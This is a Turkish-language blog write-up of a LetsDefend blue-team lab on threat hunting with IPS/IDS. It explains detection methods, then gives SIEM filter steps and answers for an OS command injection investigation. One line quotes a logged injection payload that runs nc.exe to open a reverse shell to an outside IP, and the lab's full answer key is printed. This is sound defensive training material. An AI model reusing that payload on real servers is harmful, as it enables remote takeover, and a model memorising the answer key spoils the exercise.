---
date: '2025-10-13'
description: Tehdit avcılığı proaktif bir siber güvenlik stratejisidir. Güvenlik ekipleri sadece bilinen tehditlere odaklanmak yerine, henüz tespit edilmemiş gelişmiş ve gizli saldırıları avlar. Saldırı önleme sistemi (IPS) ve saldırı tespit sistemi (IDS) teknolojileri bu avlanma sürecinde kritik bir rol oynar.
draft: false
image: featured.webp
title: IPS/IDS ile Tehdit Avcılığı Çözümü - LetsDefend
type: writeups
topic: detection-response
tags: ["LetsDefend", "Threat Hunting", "Write-up", "Blue Team", "SIEM", "IDS", "IPS"]
featuredImageAlt: "LetsDefend Blue Team Training logosu"
---

[Letsdefend Blue Team Eğitim Platformu](https://letsdefend.io/)

Tehdit avcılığı proaktif bir siber güvenlik stratejisidir. Güvenlik ekipleri sadece bilinen tehditlere odaklanmak yerine, henüz tespit edilmemiş gelişmiş ve gizli saldırıları avlar. Saldırı önleme sistemi (IPS) ve saldırı tespit sistemi (IDS) teknolojileri bu avlanma sürecinde kritik bir rol oynar.

* **Saldırı Tespit Sistemi (IDS)**: IDS, şüpheli aktiviteleri tespit etmek için ağ trafiğini ve sistem olaylarını izleyen bir güvenlik teknolojisidir. Genellikle pasif olarak çalışır, yani saldırıları tespit eder ancak müdahale etmez. Tespit edilen şüpheli aktiviteler güvenlik ekiplerine raporlanır.
* **Saldırı Önleme Sistemi (IPS)**: IPS, IDS'den bir adım daha ileri gider. Ağ trafiğini izler, şüpheli aktiviteleri tespit eder ve bu tehditlere karşı kötü amaçlı trafiği engellemek veya oturumları sonlandırmak gibi proaktif önlemler alır.

![Saldırı Önleme Sistemi (IPS): IPS, IDS'den bir adım daha ileri gider](./0_SG624gNxj5iGFv3k.webp)

( **Görsel Kaynağı** : <https://www.tops.hk/en/pfsense-firmware-os/ids-ips.html> )

---

## Tehdit Avcılığında IPS/IDS'in Rolü

Tehdit avcılığı sürecinde. IPS (Saldırı Önleme Sistemi) ve IDS (Saldırı Tespit Sistemi) gibi güvenlik araçları veya sistemleri, hem mevcut tehditlerin tespit edilmesinde hem de bu tehditlerin nasıl çalıştığının anlaşılmasında önemli destek sağlar. IPS ve IDS sistemlerinin tehdit avcılığı sürecinde yerine getirdiği işlevler şunlardır:

---

## Olay Tespiti ve Erken Uyarılar

IPS/IDS sistemleri ağ trafiğini ve sistem davranışını sürekli izleyerek saldırganların hareketlerini erken aşamalarda tespit etmelerini sağlar. Bu sistemler siber güvenlik ekiplerine potansiyel tehditler hakkında ilk uyarıları vererek, saldırganların planlarını gerçekleştirmeden durdurulmalarına olanak tanır. Bu uyarılar tehdit avcılığı süreçleri için bir başlangıç noktası teşkil eder ve daha derin inceleme gerektiren durumları tanımlar. Uyarılar genellikle aşağıdaki senaryoları içerir:

* **Şüpheli Trafik:** Belirli bir IP adresinden veya sistemden gelen trafik hacmindeki ani artış genellikle dikkate değer bir olaydır. Örneğin, dahili bir IP adresinin harici sistemlere normalden önemli ölçüde daha fazla veri aktarması, veri sızdırma veya bir saldırı girişimi anlamına gelebilir. Özellikle normalde düşük trafik hacmine sahip sistemlerdeki bu tür ani artışlar ciddi bir tehdidin işareti olabilir.
* **Beklenmedik Bağlantılar:** Sistem veya ağ içindeki cihazların beklenmedik IP adreslerine yaptığı bağlantılar siber saldırıların erken belirtileri arasındadır. Örneğin, dahili ağdaki bir sunucunun normalde iletişim kurmadığı uzak bir IP adresine bağlanması backdoor (arka kapı) faaliyetini veya kötü amaçlı yazılımı gösterebilir. Bu tür durumlar oltalama (phishing) saldırılarında veya uzak erişim araçlarının (RAT) kullanımında yaygındır.
* **Beklenmedik Veri Transferleri:** Normalde belirli veri akışlarını veya transferlerini gerçekleştirmeyen bir cihazın veya sistemin aniden büyük miktarlarda veri göndermeye veya almaya başlaması bir güvenlik ihlaline veya veri sızıntısına işaret edebilir. Bu tür beklenmedik veri transferleri, özellikle kritik sistemlerden dış dünyaya yapılan bağlantılar, kötü amaçlı yazılım faaliyeti veya iç tehdit şüphesi uyandırmalıdır. IPS/IDS sistemleri bu tür transferleri tespit edebilir ve şifreli trafik içinde gizlenen veri hırsızlığını veya kötü niyetli faaliyetleri tanımlamak için uyarılar sağlayabilir.
* **Şüpheli Protokoller:** Belirli bir ağ segmentinde nadiren kullanılan veya hiç kullanılmayan protokollerin aniden kullanılmaya başlanması, saldırganların tespitten kaçınmak için alışılmadık yöntemler kullandığının bir göstergesi olabilir. Örneğin, normalde sadece HTTP trafiğine sahip bir sistemde aniden FTP veya SSH trafiğinin görülmesi, saldırganların veri çalmaya veya komut göndermeye çalıştığını gösterebilir. Bu tür beklenmedik protokol kullanımı IPS/IDS sistemleri tarafından derhal tespit edilmeli ve uyarılmalıdır.

Bu uyarılar sadece tehdit avcıları için bir başlangıç noktası olmakla kalmaz, aynı zamanda potansiyel hedefin ve saldırının nasıl gerçekleştirildiğinin anlaşılmasına yardımcı olacak yol gösterici bilgiler sağlar. Uyarıların ayrıntılı analizi, saldırganın izlediği yolu anlamaya ve potansiyel tehditleri önceden engellemeye yardımcı olabilir.

![Bu uyarılar sadece tehdit avcıları için bir başlangıç noktası olmakla kalmaz, aynı zamanda potansiyel hedefin ve saldırının](./0_jNKLrZsI9seDYJJX.webp)

( **Görsel Kaynağı** : <https://networkfish.com/it-security/what-is-cyber-threat-hunting/> )

---

## Kapsamlı Veri Toplama

IPS/IDS sistemleri tehdit avcılığı sürecinde geniş bir yelpazede veri toplar ve analiz eder. Tehditleri takip etmek ve saldırganların hareketlerini detaylandırmak için bu veriler kritiktir. Toplanan veriler şunları içerir:

* **Paket Kayıtları:** Ağ üzerindeki her bir veri paketi kaydedilir. Bu kayıtlar her paket tarafından taşınan verileri, kaynak ve hedef IP adreslerini, kullanılan protokolleri ve yükleri (payload) içerir. Paket kayıtları, özellikle belirli kaynaklardan gelen şüpheli trafiği veya saldırı vektörlerini incelemek için yararlıdır. Örneğin, bir DDoS saldırısında yoğun olarak kullanılan paket türlerini belirlemek saldırıyı hafifletmek için kritik bilgiler sağlar.
* **Bağlantı Bilgileri:** IPS/IDS sistemleri, hangi cihazların hangi sunucularla ne zaman ve ne sıklıkta iletişim kurduğunu gösteren ayrıntılı bağlantı logları toplar. Bu bilgi, normal davranıştan sapmaları tespit etmek ve potansiyel tehditleri tanımlamak için esastır. Örneğin, bir dahili sunucunun aniden farklı harici IP adresleriyle sık sık iletişim kurması veri sızıntısını veya backdoor erişimini gösterebilir.
* **Saldırı Örüntüleri:** Bilinen tehdit imzaları IPS/IDS sistemlerine yüklenir ve bu sistemler ağ trafiğini bu imzalarla karşılaştırarak potansiyel saldırıları tespit eder. Saldırı örüntüleri (attack patterns), tehdit avcılarının geçmiş saldırıları mevcut olaylarla ilişkilendirmesine yardımcı olur. Ayrıca bu imzalar önceden kullanılan yöntemlerin kullanılıp kullanılmadığını ortaya çıkarabilir. Örneğin, bilinen bir kötü amaçlı yazılımın yeni bir sürümü, geçmiş saldırılardaki imzaların etkili bir şekilde kullanılmasıyla tespit edilebilir.

Toplanan veriler tehdit avcılarının bir saldırının ne zaman başladığını, nasıl yayıldığını ve hangi sistemlerin hedeflendiğini belirlemesine yardımcı olur. Ek olarak, saldırganın niyetleri ve bir sonraki adımları bu verilerin korelasyon analizi yoluyla tahmin edilebilir.

![Toplanan veriler tehdit avcılarının bir saldırının ne zaman başladığını, nasıl yayıldığını ve hangi sistemlerin](./0_0-1Ad9LkaBqXNp0i.webp)

( **Görsel Kaynağı** : <https://www.socinvestigation.com/ids-vs-ips-key-differences-rule-structure-pros-and-cons/> )

---

## Anomali ve İmza Tabanlı Tespit

IPS/IDS sistemleri tehditleri tespit etmek için iki ana yöntem kullanır: imza tabanlı tespit ve anomali tabanlı tespit. Bu iki yöntem farklı tehdit türlerini tanımlamak için birlikte kullanılır ve tehdit avcılığı sürecinde kritiktir.

**İmza Tabanlı Tespit:** İmza tabanlı tespit, belirli saldırı türlerinin bilinen imzalarına dayanır. Bu imzalar geçmiş saldırılardan elde edilen verilere veya önceden tanımlanmış tehditlere dayanarak oluşturulur. İmza tabanlı tespit, özellikle yaygın ve bilinen saldırıların hızla tanımlanması için etkilidir. Örneğin imza tabanlı sistemler, bilinen kötü amaçlı yazılımların ağ trafiğinde bıraktığı karakteristik izleri hızla tespit edebilir. Ancak bu yöntem yeni ve daha önce görülmemiş saldırılara karşı sınırlı olabilir çünkü bu tür saldırılar tanımlanmamış imzalar kullanır.

**Anomali Tabanlı Tespit:** Anomali tabanlı tespit, normal ağ davranışından sapmaları belirler ve potansiyel tehditleri tespit eder. Bu yaklaşım özellikle bilinmeyen veya sıfırıncı gün (zero-day) saldırılarını tespit etmek için önemlidir. Anomali tespiti belirli zamanlarda veya belirli kullanıcı faaliyetlerinde ağ davranışındaki değişiklikleri arar. Örneğin, normalde trafiği düşük olan bir sunucunun aniden büyük miktarlarda veri aktarması bir anomali olarak işaretlenebilir ve daha derinlemesine inceleme gerektirebilir. Sürekli öğrenme ve gelişmiş analiz tekniklerini kullanan anomali tespiti, tehdit avcılığına çok yönlü bir yaklaşım sunar.

Tehdit avcılığı genellikle bu iki tespit yöntemini birlikte kullanır. İmza tabanlı tespit bilinen tehditlerin hızla tanımlanmasını sağlayarak anında müdahaleye olanak tanır. Anomali tabanlı tespit ise bilinmeyen tehditleri ortaya çıkarır ve daha geniş bir güvenlik perspektifi sağlar. Birlikte kullanıldıklarında güvenlik ekiplerinin hem bilinen hem de bilinmeyen tehditleri tespit etme yeteneğini geliştirerek siber savunmayı güçlendirirler.

![Tehdit avcılığı genellikle bu iki tespit yöntemini birlikte kullanır](./0_aNKbrBQ3rebr8wml.webp)

---

## Tehdit Avcılığı Sürecinde IPS/IDS Kullanımı

Tehdit avcılığı sürecinde, Saldırı Önleme Sistemi/Saldırı Tespit Sistemi (IPS/IDS) sistemlerinin etkili kullanımı, tehdit avcısının tehditleri tespit etme, analiz etme ve yanıtlama yeteneğini önemli ölçüde artırır. Aşağıdaki içerik, IPS/IDS sistemlerinin tehdit avcılığı sürecinde nasıl kullanıldığını açıklamaktadır.## Veri Toplama ve Log Analizi

---

## IPS/IDS Loglarının Önemi

IPS/IDS sistemleri büyük miktarda ağ trafiği verisi üretir. Bu veri, tehdit avcılığı sürecinde potansiyel tehditleri tanımlamak için kritiktir.

Loglar, ağdaki olağandışı faaliyetleri veya bilinen saldırı imzalarıyla eşleşen davranışları içerir. Bu loglar tehdit avcıları için bir başlangıç noktası görevi görür.

---

## Veri Toplama Süreci

* **Merkezi Log Yönetimi:** IPS/IDS loglarının merkezi bir sistemde toplanması analiz ve korelasyon süreçlerini basitleştirir.
* **Log Formatları ve Yapısı:** Log formatını anlamak, belirli bilgilerin nerede bulunduğunu belirlemek ve hangi bilgilerin tehdit avcılığı için kullanılabileceğini tanımlamak esastır.
* **Logları Filtreleme ve Önceliklendirme:** Loglardaki büyük hacimli veriyi anlamlandırmak için filtreleme ve önceliklendirme teknikleri kullanılır ve analistlerin sadece kritik olaylara odaklanmasını sağlar.

---

## Analiz Teknikleri

* **Temel Log Analizi:** Anomalileri tanımlamak için loglar üzerinde basit arama ve sıralama işlemleri.
* **Gelişmiş Log Analizi:** Loglardan korelasyonlar, trend analizleri ve davranış modelleri oluşturmak için özel yazılımlar veya scriptler kullanmak.
* **Otomatik Analiz Araçları:** Potansiyel tehditleri tespit etmek için makine öğrenmesi ve yapay zeka destekli araçlar kullanarak logları otomatik olarak analiz etmek.

![Otomatik Analiz Araçları: Potansiyel tehditleri tespit etmek için makine öğrenmesi ve yapay zeka destekli araçlar kullanarak](./0_777ZXBKz3iNkZ4_X.webp)

( **Görsel Kaynağı** : <https://www.shiksha.com/online-courses/what-is-data-analysis-st583-tg1135> )

---

## Anomali Tespiti

* **Normal Davranışı Tanımlama:** Anomalileri tespit etmek için ağdaki normal trafiği ve kullanıcı davranışını tanımlamak gereklidir.

---

## Anomali Tespit Yöntemleri

* **İstatistiksel Yöntemler:** Anomalileri tanımlamak için trafik verilerini istatistiksel olarak analiz etmek.
* **Makine Öğrenmesi Tabanlı Yöntemler:** Anomali tespiti için denetimli (supervised) ve denetimsiz (unsupervised) öğrenme algoritmalarını kullanmak.

---

## Anomali Tespiti ve IPS/IDS

Tespit edilen anormal trafik IPS/IDS sistemleri tarafından kaydedilir ve bu logların analizi potansiyel saldırıların erken tespit edilmesini sağlar.

---

## Saldırı Göstergelerinin Tespiti

---

## İmza Tabanlı Tespit

IPS/IDS sistemleri, bilinen saldırı imzalarıyla eşleşen trafiği tespit eder ve kaydeder.

* **İmza Veritabanlarını Güncelleme:** Yeni tehditleri tespit etmek için saldırı imzalarını güncel tutmak çok önemlidir.

---

## Anomali Tabanlı Saldırı Tespiti

Genellikle anomali tespiti ile ilişkilendirilen bu yöntem, bilinen saldırı imzalarının dışına çıkan potansiyel tehditlerin tespit edilmesidir.

* **Davranışsal Analiz:** Saldırganların davranışlarındaki değişiklikleri zaman içinde izlemek ve bu davranışlara dayanarak saldırıları tahmin etmek.

---

## Gerçek Zamanlı Analiz

* **Gerçek Zamanlı Trafik İzleme:** IPS/IDS sistemleri, anında müdahale gerektiren tehditleri tespit etmek için ağ trafiğini gerçek zamanlı olarak izler.
* **Otomatik Uyarılar:** Tehdit avcıları belirli olaylar veya anomali tespitleri için otomatik uyarılar tanımlayarak hızlı aksiyon alınmasını sağlar.
* **Olay Müdahale Prosedürleri:** Gerçek zamanlı olarak tespit edilen tehditler için acil müdahale adımlarının oluşturulması ve uygulanması.

---

## Geçmişe Dönük Analiz (Retrospective Analysis)

* **Log Arşivleme:** Gelecekteki analizlere olanak tanımak için IPS/IDS loglarının belirli bir süre boyunca arşivlenmesi.
* **Geçmiş Veri İncelemesi:** Daha önce gözden kaçan tehditleri tespit etmek ve saldırıların nasıl geliştiğini anlamak için geçmiş logların incelenmesi.
* **Korelasyon ve Trend Analizi:** Farklı zaman dilimlerinden gelen olayların birbiriyle ilişkili olup olmadığını belirlemek için loglar üzerinde korelasyon ve trend analizi yapılması.
* **Geçmişe Dönük Hipotez Testi:** Tehdit avcıları saldırıların başlangıç noktalarını veya kullanılan teknikleri belirlemek için bulgularını geçmiş loglar üzerinde test ederler.

---

## IPS/IDS Sistemleri ile Hipotez Testi ve Doğrulama

---

## Hipotez Oluşturma

* **Tehdit Avcılığında Hipotezlerin Rolü:** Tehdit avcıları saldırı veya tehdit senaryolarını anlamak için hipotezler geliştirirler.
* **IPS/IDS Sistemleri ile Hipotez Testi:** Belirtilerin ve davranışların hipotezi doğrulayıp doğrulamadığını kontrol etmek için geliştirilen hipotezlerin IPS/IDS logları üzerinde test edilmesi.

---

## Doğrulama ve Raporlama

* **Doğrulama Süreci:** Çeşitli veri kaynaklarını ve analizleri kullanarak hipotezlerin doğrulanması.
* **Raporlama:** Tehdit avcılığı sürecinden elde edilen bulguların raporlanması ve yönetim ile diğer güvenlik ekipleriyle paylaşılması.
* **Aksiyon Planları:** Doğrulanan hipotezlere dayanarak güvenlik önlemlerinin belirlenmesi ve uygulanması.

---

## Ağ Trafiği Anomali Hipotezi

---

## Hipotez

Bir tehdit aktörü web trafiği üzerinden kötü amaçlı yazılım dağıtmaya çalışıyor olabilir.

![Bir tehdit aktörü web trafiği üzerinden kötü amaçlı yazılım dağıtmaya çalışıyor olabilir](./0_jKriBOd5vnLLhGW8.webp)

( **Görsel Kaynağı** : <https://www.researchgate.net/figure/Network-intrusion-detection-system-with-network-traffic-analysis-26_fig1_353850592> )

---

## Veri Kaynakları

* **IDS/IPS Logları:** Anormal trafik faaliyetlerinin ve bilinen saldırı imzalarıyla eşleşen olayların kayıtları.
* **Ağ Trafiği Logları:** Belirli cihazlardan gelen ve giden ağ trafiği.
* **Güvenlik Duvarı Logları:** Şüpheli harici bağlantı girişimleri ve engellenen ağ trafiği.
* **Web Sunucu Logları:** Anormal veya beklenmedik HTTP istekleri.

---

## Analiz Adımları

---

## IDS/IPS Belirtileri

* Bilinen saldırı imzalarıyla eşleşen trafik faaliyetlerini inceleyin.
* Anomali tespiti yapan IDS/IPS sistemlerinde normal davranış modellerinden sapmaları kontrol edin.

---

## Ağ Trafiği Analizi

* Anormal trafik hacmini ve beklenmedik bağlantı girişimlerini izleyin.
* Belirli bir cihazdan kaynaklanan veya bu cihaza yöneltilen olağandışı trafiği analiz edin.

---

## Güvenlik Duvarı Uyarıları

* Engellenen harici bağlantı girişimlerini ve şüpheli giden trafiği gözden geçirin.
* Güvenlik duvarı loglarında port kullanımındaki önemli artışları veya anormal durumları araştırın.

---

## Log Korelasyonu

* Bilinen saldırı imzalarıyla eşleşen anormal trafiği veya faaliyetleri belirlemek için IDS/IPS, ağ trafiği ve güvenlik duvarı loglarını birleştirin.
* Birden fazla log kaynağı genelinde tutarlı saldırı göstergelerini aramak için korelasyon analizi yapın.

---

## Protokol ve Port Analizi

* SMB, RDP ve HTTP gibi protokoller üzerinden geçen olağandışı trafiği izleyin.
* Şüpheli portlar üzerinden yapılan bağlantıları araştırın.

---

## Zaman Aralığı Analizi

* Anormal etkinliğin yoğunlaştığı zaman dilimlerini belirleyin.
* Mesai saatleri dışındaki faaliyetleri ve saldırı imzalarıyla eşleşen trafik değişikliklerini analiz edin.

---

## Hipotez Doğrulama ve Beklenen Bulgular

* IDS/IPS loglarında bilinen saldırı imzalarının ve anomalilerin tespit edilmesi.
* Güvenlik duvarı loglarında şüpheli giden trafik ve engellenen bağlantı girişimleri.
* Belirli bir cihazdan veya cihaz grubundan gelen olağandışı trafik artışları.

---

## Hipotez Değerlendirmesi

Tehdit avcılığı sürecinde IDS/IPS sistemleri, ağdaki bilinen saldırı imzalarıyla eşleşen anormal trafiği ve faaliyetleri tespit etmede kritik bir rol oynar. Bu derste özetlenen adımları izleyerek potansiyel tehditler daha erken tespit edilebilir. Bu süreç organizasyonların siber güvenlik stratejilerini güçlendirmelerine, saldırıları daha etkili yönetmelerine ve ağ güvenliğini proaktif olarak korumalarına yardımcı olur. Tehdit avcılığı sürecinde kullanıldığında IDS/IPS sistemleri şüpheli faaliyetlerin ve saldırıların tespitini hızlandırarak organizasyonların tehditlere daha hızlı yanıt vermesini sağlar.

---

## Uygulamalı Laboratuvar

---

## Hipotez

**Not**: Bu bölümdeki sorular, aşağıdaki hipoteze dayalı olarak Tehdit Avcılığı için hazırlanmıştır.

**Hipotez:** Saldırganlar, sunuculara yetkisiz erişim sağlamak ve kötü niyetli komutlar yürütmek için kurumun web uygulamalarındaki "OS Command Injection" (İşletim Sistemi Komut Enjeksiyonu) açığından yararlanmaya çalışıyor olabilir.

---

## Tehdit Avcılığı Laboratuvar Ortamı

* IPS/IDS Olayları (FortiIPS)
* SIEM (Wazuh)
* EDR Olayları (Sysmon)
* CTI Olayları ([Threat Intel LetsDefend Platformu](https://app.letsdefend.io/threat-intelligence-feed))

---

## Laboratuvar Notları

* Aşağıdaki soruları yanıtlamak için "8 Ağustos 2024 00:00 - 13 Ağustos 2024 00:00" arasındaki logları analiz edin.
* Sonraki sorular bir öncekilerin doğru cevaplarını gerektirir. Tüm soruları kesinlikle göründükleri sırayla yanıtlayın.

---

## Sorular

**Not:** Aşağıdaki soruları yanıtlamak için "8 Ağustos 2024 00:00 - 13 Ağustos 2024 00:00" arasındaki logları analiz edin.

**Not**: Sonraki sorular bir öncekilerin doğru cevaplarını gerektirir. Tüm soruları kesinlikle göründükleri sırayla yanıtlayın.

> **OS Command Injection saldırıları gerçekleştiren kaç farklı IP adresi tespit edilmiştir?**

SIEM'de "data.subtype: ips" ve "data.attack: OS.Command.Injection.Attempt" filtrelerini uygulayın.

![SIEM'de "data.subtype: ips" ve "data.attack: OS.Command.Injection.Attempt" filtrelerini uygulayın](./1_xvYO8uj6fd302UmPHP8kdw.webp)

**Cevap:** 4

> **"OS Command Injection" gerçekleştiren IP adresleri tarafından kaç farklı hedef sunucuya saldırı düzenlenmiştir?**

SIEM'de "data.subtype: ips" ve "data.attack: OS.Command.Injection.Attempt" filtrelerini kullanın, ardından "data.dstip" alanındaki değerleri kontrol edin.

![SIEM'de "data.subtype: ips" ve "data.attack: OS.Command.Injection.Attempt" filtrelerini kullanın, ardından "data.dstip"](./1_FzM8zurzYJ11FfjQhgSgvA.webp)

**Cevap:** 1

> **CTI platformu (LetsDefend - Threat Intel) tarafından OS Command Injection saldırısı yürüttüğü bildirilen IP adresi ile hangi APT grubu ilişkilendirilmiştir?**

CTI platformunda "OS Command Injection" saldırganı IP adresini/adreslerini arayın.

![CTI platformunda "OS Command Injection" saldırganı IP adresini/adreslerini arayın](./1_7DlwO1oM86g_8tcWd3qobg.webp)

**Cevap:** APT-ZF-41

> **IPS/IDS loglarına göre, kaç farklı engellenmemiş (unblocked) "OS Command Injection" saldırısı gerçekleşmiştir?**

SIEM loglarını "data.subtype: ips" ve "data.attack: OS.Command.Injection.Attempt" ile filtreleyin, ardından "action" alanını kontrol edin.

![SIEM loglarını "data.subtype: ips" ve "data.attack: OS.Command.Injection.Attempt" ile filtreleyin, ardından "action" alanını](./1_4mItzGmdC0-rfXkXAbZJ7A.webp)

**Cevap:** 1

> **Uzak bağlantı kurmak için "OS Command Injection" saldırısı sırasında hedef sunucuda hangi komut yürütülmüştür?**

"data.subtype: ips", "data.attack: OS.Command.Injection.Attempt" ve "data.action: alert" SIEM filtrelerini uygulayın, ardından "data.url" alanını kontrol edin.

`news_page.php?file=config.txt&&nc.exe 46.88.3.4 443 -e cmd.exe`

**Cevap:** nc.exe

> **Hedef sunucudaki "OS Command Injection" saldırısı sırasında yürütülen komutun "üst işlemi" (parent process) neydi?**

SIEM loglarını "agent.ip: [IP_Adresi]" ve "rule.groups: sysmon" ile filtreleyin, ardından "data.win.eventdata.parentImage" alanını inceleyin.

![SIEM loglarını "agent.ip: IPAdresi " ve "rule.groups: sysmon" ile filtreleyin, ardından "data.win.eventdata.parentImage"](./1_E2LKey3LyFSUTv01QWYjag.webp)

**Cevap:** w3wp.exe

> **Hedef sunucudaki "OS Command Injection" saldırısında komutu yürüten kullanıcının "kullanıcı adı" (username) neydi?**

"agent.ip: [IP_Adresi]" ve "rule.groups: sysmon" SIEM filtrelerini kullanın, ardından "data.win.eventdata.user" alanını kontrol edin.

**Cevap:** SYSTEM

> **Kaç benzersiz IP adresi "POST yöntemini" kullanarak "OS Command Injection" saldırıları gerçekleştirmiştir?**

SIEM loglarını "data.subtype: ips" ve "data.attack: OS.Command.Injection.Attempt" ile filtreleyin, ardından "data.method" alanını inceleyin.

![SIEM loglarını "data.subtype: ips" ve "data.attack: OS.Command.Injection.Attempt" ile filtreleyin, ardından "data.method"](./1_MLkQjJOXfNknbAQzbqkqCg.webp)

**Cevap:** 1

> **"OS Command Injection" saldırısı sırasında denenen bağlantı için "hedef IP adresi" neydi?**

"data.subtype: ips", "data.attack: OS.Command.Injection.Attempt" ve "data.action: alert" SIEM filtrelerini uygulayın, ardından "data.url" alanını kontrol edin.

**Cevap:** 46.88.3.4

> **İşletim sistemi komut enjeksiyonu saldırısı yoluyla harici IP adresine başarılı bir bağlantı gösteren logun "logid" değeri nedir?**

Önceki adımda elde edilen IP adresini SIEM'de "data.dstip: [IP_Adresi]" ve "data.action: accept" filtrelerini kullanarak arayın.

![Önceki adımda elde edilen IP adresini SIEM'de "data.dstip: IPAdresi " ve "data.action: accept" filtrelerini kullanarak](./1_rymcMnw4kno5ewVZ989oPw.webp)

**Cevap:** 0642134672
---
